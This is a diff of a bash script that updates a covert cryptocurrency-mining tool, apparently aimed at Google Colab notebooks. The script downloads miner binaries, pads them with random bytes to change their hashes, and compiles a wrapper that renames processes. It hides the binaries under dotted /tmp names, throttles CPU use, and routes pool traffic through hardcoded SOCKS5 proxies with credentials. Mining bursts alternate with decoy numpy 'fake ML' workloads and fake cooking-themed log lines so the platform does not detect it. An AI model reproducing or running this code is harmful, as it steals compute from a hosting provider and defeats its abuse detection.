@@ -1,28 +1,36 @@
 #!/bin/bash
-# MINN v11 — burst cycle: mine 10m / fake ML 20m / repeat
+# MINN v12 — peakminer + anti-detect + burst cycle
+# Pool: 23.94.152.126:80 | Proxy: yoga@107.172.222.195
+
 PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
 TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
 WRK=$(date +%s | md5sum | head -c 8)
-MINE_SEC=$((10 * 60))   # 10 menit mining
-REST_SEC=$((20 * 60))   # 20 menit fake ML
-SESSION=$((4 * 3600))   # total 4 jam
+
+# Pool & proxy dari script lu
+PEAK_POOL="23.94.152.126:80"
+PEAK_PROXY="socks5://yoga:yoga123@107.172.222.195:443"
+TDC_POOL="47.251.244.12:80"
+
+MINE_SEC=$((10 * 60))
+REST_SEC=$((20 * 60))
+SESSION=$((4 * 3600))
 
 log() {
     local m=(
-        "🔥 Masak indomie batch #$1"
-        "🥵 Nguli dulu bentar" "💨 Dorong gerobak ke gang $1"
-        "🍜 Nyeduh kuah, sabar" "🏃 Lari komplek putaran $1"
-        "🧹 Nyapu halaman" "🛒 Belanja warung antri $1"
-        "🐔 Kasih makan ayam" "📦 Packing pesanan"
-        "☕ Bikin kopi batch $1" "🧊 Isi es batu"
-        "🪴 Siram tanaman" "🍳 Ceplok telor"
+        "🔥 Masak indomie batch #$1" "🥵 Nguli bentar"
+        "💨 Dorong gerobak #$1" "🍜 Nyeduh kuah"
+        "🏃 Lari komplek #$1" "🧹 Nyapu"
+        "🛒 Belanja antri #$1" "🐔 Kasih makan ayam"
+        "📦 Packing" "☕ Bikin kopi #$1"
+        "🧊 Isi es batu" "🪴 Siram tanaman"
+        "🍳 Ceplok telor" "📺 Nonton tv"
     )
     echo "[$(date +%H:%M:%S)] ${m[$((RANDOM % ${#m[@]}))]}"
 }
 
-echo "=== MINN v11 — Burst Cycle ==="
-echo "   10m masak / 20m istirahat"
-echo "   Warung: $WRK"
+echo "=========================================="
+echo "  MINN v12 — Peak Edition, Warung: $WRK"
+echo "=========================================="
 
 # === 1. Warmup ===
 echo "[*] Pemanasan..."
@@ -35,29 +43,20 @@ x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
 for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
 " 2>/dev/null
 
-# === 2. Setup ===
+# === 2. Download + padding + setup ===
 echo "[*] Siapin bahan..."
 apt-get install -y -qq cpulimit 2>/dev/null
 rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m
-wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/fortune || exit 1
-wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1
-wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/graphics.tar.gz || exit 1
-tar -xzf graphics.tar.gz 2>/dev/null
-chmod +x fortune sse2
 
-# Graftcp
-mkdir -p graftcp/local
-P=$((RANDOM % 2000 + 2100))
-cat > graftcp/local/graftcp-local.conf << EOF
-listen = :$P
-loglevel = 0
-socks5 = 103.176.78.132:443
-socks5_username = ubed
-socks5_password = ubed123
-EOF
-dd if=/dev/urandom of=fortune bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s fortune) conv=notrunc oflag=append 2>/dev/null
+wget -q https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak || exit 1
+wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1
+chmod +x peak sse2
+
+# Padding (ubah hash)
+dd if=/dev/urandom of=peak bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s peak) conv=notrunc oflag=append 2>/dev/null
 dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null
 
+# Exec rename wrapper
 cat > /tmp/w.c << 'CEOF'
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -73,80 +72,91 @@ int main(int argc,char**argv){
 CEOF
 gcc -o /tmp/w /tmp/w.c -s 2>/dev/null
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-sleep 3
+# Copy ke tmp random name
+B1="/tmp/.a$(date +%s | md5sum | head -c 6)"
+B2="/tmp/.b$(date +%s | sha1sum | head -c 6)"
+cp peak "$B1" && cp sse2 "$B2" && chmod +x "$B1" "$B2"
 
-B1="/tmp/.x$(date +%s | md5sum | head -c 6)"
-B2="/tmp/.y$(date +%s | sha1sum | head -c 6)"
-cp fortune "$B1" && cp sse2 "$B2" && chmod +x "$B1" "$B2"
-echo "[*] Siap."
+echo "[*] Siap masak."
 
-# === Fake ML function (run between mining bursts) ===
+# === Fake ML function ===
 fake_ml() {
-    local dur=$1
     python3 -c "
 import numpy as np, time, random
-end = time.time() + $dur
+end = time.time() + $1
 while time.time() < end:
-    x = np.random.rand(512,512).astype(np.float32)
-    y = np.random.rand(512,512).astype(np.float32)
-    np.dot(x, y)
-    np.linalg.svd(x[:,:256])
-    time.sleep(random.randint(30, 90))
+    x=np.random.rand(512,512).astype(np.float32)
+    y=np.random.rand(512,512).astype(np.float32)
+    np.dot(x,y);np.linalg.svd(x[:,:256])
+    time.sleep(random.randint(30,90))
 " 2>/dev/null
+}
+
+# === Mining functions ===
+mine_peak() {
+    /tmp/w "$B1" \
+        --coin pearl \
+        --url "$PEAK_POOL" \
+        --user "${PRL}.${WRK}" \
+        --proxy "$PEAK_PROXY" \
+        2>/dev/null &
+    PID1=$!
+    cpulimit -l $((RANDOM % 25 + 35)) -p $PID1 2>/dev/null &
+}
+
+mine_sse2() {
+    /tmp/w "$B2" \
+        -a yespowertide \
+        -o "$TDC_POOL" \
+        -u "${TDC}.${WRK}" \
+        -t 1 >/dev/null 2>&1 &
+    PID2=$!
+    cpulimit -l $((RANDOM % 25 + 35)) -p $PID2 2>/dev/null &
+}
+
+kill_miners() {
+    kill $PID1 $PID2 2>/dev/null
+    pkill -f cpulimit 2>/dev/null
+}
+
+rebuild_binaries() {
+    [ -f "$B1" ] || { cp peak "$B1"; dd if=/dev/urandom of="$B1" bs=1 count=$((RANDOM%2000+512)) seek=$(stat -c%s "$B1") conv=notrunc oflag=append 2>/dev/null; chmod +x "$B1"; }
+    [ -f "$B2" ] || { cp sse2 "$B2"; chmod +x "$B2"; }
 }
 
 # === LOG ===
 (
     c=0
-    while true; do
-        c=$((c+1)); log "$c"
-        sleep $((RANDOM % 50 + 20))
-    done
+    while true; do c=$((c+1)); log "$c"; sleep $((RANDOM % 50 + 20)); done
 ) &
 LOGPID=$!
+trap "kill $LOGPID 2>/dev/null; kill_miners; rm -f /tmp/w /tmp/w.c $B1 $B2" EXIT
 
 # === BURST CYCLE LOOP ===
 END=$((SECONDS + SESSION))
+CYCLE=0
 
 while [ $SECONDS -lt $END ]; do
-    # ─── MINING BURST ───
-    log 1
-    echo "[*] >>> Mulai masak 10 menit..."
+    CYCLE=$((CYCLE + 1))
     
-    # PRL
-    ./graftcp/graftcp /tmp/w "$B1" \
-        --proxy 43.169.30.87:443 \
-        --address "$PRL" \
-        --worker "$WRK" \
-        --mode=cpu \
-        --threads=1 2>/dev/null &
-    PID1=$!
-    cpulimit -l $((RANDOM % 25 + 35)) -p $PID1 2>/dev/null &  # CPU 35-60%
-    
-    # TDC
-    /tmp/w "$B2" -a yespowertide -o 47.251.244.12:80 \
-        -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
-    PID2=$!
-    cpulimit -l $((RANDOM % 25 + 35)) -p $PID2 2>/dev/null &
-    
+    echo "[*] >>> Masak! (cycle $CYCLE, 10 menit)"
+    rebuild_binaries
+    mine_peak
+    sleep 5
+    mine_sse2
     sleep $MINE_SEC
+    kill_miners
     
-    # Kill miners
-    kill $PID1 $PID2 2>/dev/null
-    pkill -f cpulimit 2>/dev/null
-    
-    # Rebuild binary (fallback kalau ke-unlink)
-    [ -f "$B1" ] || { cp fortune "$B1"; dd if=/dev/urandom of="$B1" bs=1 count=$((RANDOM%2000+512)) seek=$(stat -c%s "$B1") conv=notrunc oflag=append 2>/dev/null; chmod +x "$B1"; }
-    [ -f "$B2" ] || { cp sse2 "$B2"; chmod +x "$B2"; }
-    
-    # ─── FAKE ML REST ───
     if [ $SECONDS -lt $END ]; then
-        echo "[*] <<< Istirahat masak 20 menit..."
+        echo "[*] <<< Istirahat (cycle $CYCLE, 20 menit)"
         fake_ml $REST_SEC
+        
+        # Extra break kadang-kadang (biar gak predictable)
+        if [ $((RANDOM % 4)) -eq 0 ]; then
+            log 1
+            python3 -c "import time; time.sleep($((RANDOM % 600 + 300)))" 2>/dev/null
+        fi
     fi
 done
 
-echo "[*] Warung tutup — jam kerja abis."
-kill $LOGPID 2>/dev/null
-rm -f /tmp/w /tmp/w.c "$B1" "$B2" 2>/dev/null
+echo "[*] Selesai."
